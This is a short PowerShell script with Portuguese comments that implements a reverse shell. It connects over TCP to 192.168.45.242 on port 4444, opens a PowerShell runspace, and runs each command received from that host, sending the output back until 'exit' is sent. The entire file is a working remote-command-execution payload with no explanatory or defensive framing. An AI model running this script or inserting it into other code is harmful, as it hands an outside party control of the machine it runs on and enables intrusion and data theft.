# Definições de conexão
$ip = "192.168.45.242"
$port = 4444

# Criação da conexão TCP
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

# Criação do Runspace
$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$rs.Open()

# Loop de recepção de comandos
while ($client.Connected) {
    $writer.Write("PS-Runspace> ")
    $input = $reader.ReadLine()
    
    if ($input -eq "exit") { break }
    if ([string]::IsNullOrWhiteSpace($input)) { continue }

    try {
        # Cria o pipeline no runspace aberto
        $pipe = $rs.CreatePipeline()
        $pipe.Commands.AddScript($input)
        $pipe.Commands.Add("Out-String")
        
        # Invoca o comando e captura o resultado
        $results = $pipe.Invoke()
        
        foreach ($obj in $results) {
            $writer.WriteLine($obj.ToString())
        }
    } catch {
        $writer.WriteLine("Erro: " + $_.Exception.Message)
    }
}

$rs.Close()
$client.Close()